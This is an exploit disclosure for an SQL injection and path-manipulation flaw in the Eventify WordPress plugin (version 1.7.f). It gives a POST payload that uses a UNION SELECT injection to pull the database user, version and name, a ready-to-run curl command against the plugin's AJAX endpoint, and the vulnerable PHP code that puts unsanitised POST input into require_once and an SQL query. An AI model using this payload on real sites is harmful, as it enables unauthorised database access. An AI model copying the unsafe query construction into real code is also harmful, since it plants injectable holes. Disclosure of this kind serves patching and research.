# Date: 2011-09-07
# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
# Version: 1.7.f (tested)
# Note: magic_quotes has to be turned off
 
---------------
PoC (POST data)
---------------
http://www.site.com/wp-content/plugins/eventify/php/ajax/fetcheventdetails.php
 npath=../../../../../wp-content&eventid=-1&#039; UNION ALL SELECT 1,2,current_user(),connection_id(),version(),database(),7,8,9--%20
 
e.g.:
curl --data "npath=../../../../../wp-content&eventid=-1&#039; UNION ALL SELECT 1,2,current_user(),connection_id(),version(),database(),7,8,9-- " http://www.site.com/wp-content/plugins/eventify/php/ajax/fetcheventdetails.php
 
---------------
Vulnerable code
---------------
require_once(str_ireplace("/wp-content","",$_POST[&#039;npath&#039;]).&#039;/wp-load.php&#039;);
$eventid =  $_POST[&#039;eventid&#039;];
$action = "fetch";
 
if($action=="fetch"){
    ...
    $qry= "select * from ".$table_name." where em_id=&#039;$eventid&#039;" ;
    ...
    $results = $wpdb->get_results($qry);



